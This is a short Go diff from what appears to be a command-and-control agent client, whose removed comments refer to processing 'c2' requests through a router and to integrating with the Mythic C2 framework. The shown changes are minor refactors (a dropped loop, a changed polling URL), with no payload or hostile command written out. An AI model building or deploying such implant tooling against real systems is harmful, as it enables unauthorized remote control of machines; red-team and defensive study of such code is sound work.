@@ -91,11 +91,6 @@ func (c *Client) handle(conn net.Conn, regData []byte) error {
 		if err != nil {
 			return err
 		}
-		strArgs := []string{}
-		for _, a := range req.Args {
-			strArgs = append(strArgs, string(a))
-		}
-
 		resp := c.router.handle(req)
 		data, err := marshalResponse(resp)
 		if err != nil {
@@ -120,7 +115,7 @@ func (c *Client) poll() (*transport.Registration, error) {
 		}
 		body = bytes.NewReader(data)
 	}
-	req, err := http.NewRequest(http.MethodGet, c.Address, body)
+	req, err := http.NewRequest(http.MethodGet, c.HTTPAddress+"/", body)
 	if err != nil {
 		return emptyReg, err
 	}
@@ -143,8 +138,6 @@ func (c *Client) poll() (*transport.Registration, error) {
 			c.cookieJar = append(c.cookieJar, cookie)
 		}
 	}
-	// TODO: Process c2 req (resp) using the router. Also, check out how much work it is to integrate with mythic
-	// TODO: from a code perspective, compared to this :)
 	taskReq := &transport.Request{}
 	if err = json.NewDecoder(resp.Body).Decode(taskReq); err != nil {
 		return emptyReg, err
